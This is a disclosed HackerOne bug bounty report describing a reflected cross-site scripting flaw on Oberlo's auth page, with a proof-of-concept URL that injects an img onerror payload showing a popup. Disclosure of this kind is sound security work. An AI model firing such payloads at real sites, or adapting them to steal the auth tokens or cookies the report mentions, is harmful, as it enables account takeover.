# Reflected XSS 

## Report Details
- **Report ID**: 569241
- **URL**: https://hackerone.com/reports/569241
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-05-06T17:19:55.447Z
- **Disclosed**: 2019-05-28T16:12:49.542Z

## Reporter
- **Username**: 0xprial
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hi team ,
I found a reflected xss on https://app.oberlo.com domain .

##Reproduce :
* Visit **https://app.oberlo.com/auth?shop=%3C/noscript%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E** in latest version of firefox browser .
* You will see popup like attacked screenshot : {F485407}

**Tested in Latest version of firefox**

## Impact

As this is a **auth** so this xss can lead to some serious issues like stealing users **auth** token or stealing browser data/cookies .

Best Regards
**Prial**

## Attachments
- Screenshot_2019-05-06_at_11.14.38_PM.png
